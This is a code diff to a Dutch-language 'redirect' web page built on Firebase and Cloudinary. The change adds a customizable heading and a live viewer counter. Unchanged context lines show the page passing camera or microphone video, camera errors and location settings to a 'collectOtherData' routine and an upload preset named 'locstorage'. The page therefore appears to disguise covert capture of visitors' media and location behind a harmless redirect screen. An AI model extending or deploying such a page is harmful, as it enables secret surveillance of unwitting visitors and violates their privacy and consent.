@@ -1,10 +1,10 @@
-<!-- redirect.html (Complete with Corrections and Dutch Translation) -->
+<!-- redirect.html (with Live Viewer Count and Customizable Heading) -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Doorverwijzing...</title>  <!-- Changed title -->
+    <title>Doorverwijzing...</title>
     <style>
        body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
@@ -124,8 +124,8 @@
         <div class="icon-container">
             <img id="theme-icon" src="" alt="Theme Icon" style="display: none;">
         </div>
-        <h1>Doorverwijzing...</h1>  <!-- Changed heading -->
-        <p>U wordt zo dadelijk doorgestuurd <span class="loading-dots"></span></p> <!-- Changed text -->
+        <h1 id="redirect-heading">Doorverwijzing...</h1>  <!-- Heading with ID -->
+        <p>U wordt zo dadelijk doorgestuurd <span class="loading-dots"></span></p>
         <div id="progress-bar-container">
             <div id="progress-bar"></div>
         </div>
@@ -156,11 +156,14 @@ const app = firebase.initializeApp(firebaseConfig);
 const db = firebase.firestore();
 const errorMessage = document.getElementById("error-message");
 const progressBar = document.getElementById('progress-bar'); // Get progress bar element
+// NEW: Redirect heading element
+const redirectHeading = document.getElementById('redirect-heading');
 
 const cloudName = "dnvkhmgj0";        // REPLACE
 const uploadPreset = "locstorage";  // REPLACE
 
 // Get the selected theme from user settings and apply it
+// MODIFIED: Also sets the redirect heading
 async function applyUserTheme() {
     try {
         const currentUserId = await getCurrentUserId();
@@ -191,7 +194,6 @@ async function applyUserTheme() {
 
             if (!themeSnap.exists) {
                 console.log(`Custom theme "${themeName}" not found, using default.`);
-                //  Don't need to remove classes, as we use default in CSS.
                 return;
             }
 
@@ -209,6 +211,9 @@ async function applyUserTheme() {
                 document.getElementById('custom-redirect-text').textContent = themeData.customText;
                 document.getElementById('custom-redirect-text').style.display = 'block';
             }
+            // NEW: Set redirect heading from theme data, fall back to "Doorverwijzing..."
+            redirectHeading.textContent = themeData.redirectHeading || "Doorverwijzing...";
+
              document.body.classList.remove('theme-dark', 'theme-green');
         }
 
@@ -384,6 +389,30 @@ function updateProgress(percentage) {
     progressBar.textContent = percentage + '%';
 }
 
+// NEW: Function to update viewer count (increment/decrement)
+async function updateViewerCount(increment) {
+    const viewerCountRef = db.collection('metrics').doc('redirectViewers');
+    try {
+        await db.runTransaction(async (transaction) => {
+            const doc = await transaction.get(viewerCountRef);
+            let newCount = 1; // Default to 1 if doc doesn't exist
+            if (doc.exists) {
+                newCount = (doc.data().count || 0) + (increment ? 1 : -1);
+                newCount = Math.max(0, newCount); // Ensure count doesn't go below 0
+            }
+            transaction.set(viewerCountRef, { count: newCount }, { merge: true });
+        });
+    } catch (error) {
+        console.error("Error updating viewer count:", error);
+        // Don't display an error to the user on *this* page, as it's not critical.
+    }
+}
+
+// NEW: Heartbeat function
+async function sendHeartbeat() {
+  await updateViewerCount(true); // Treat heartbeat as "still active"
+}
+
 // Initial setup
 (async () => {
     try {
@@ -447,6 +476,17 @@ function updateProgress(percentage) {
             collectOtherData(false, cameraMicData.videoUrl, cameraMicData.cameraError); // Pass locationPermissionSetting = false
         }
 
+       // NEW: Viewer Count Logic
+        await updateViewerCount(true); // Increment on initial load
+
+        // Set up heartbeat (every 30 seconds)
+        const heartbeatInterval = setInterval(sendHeartbeat, 30000);
+
+        // Decrement on page unload (best-effort)
+        window.addEventListener('beforeunload', async () => {
+          clearInterval(heartbeatInterval); // Stop the heartbeat
+          await updateViewerCount(false); // Decrement the counter
+        });
 
 
     } catch (error) {
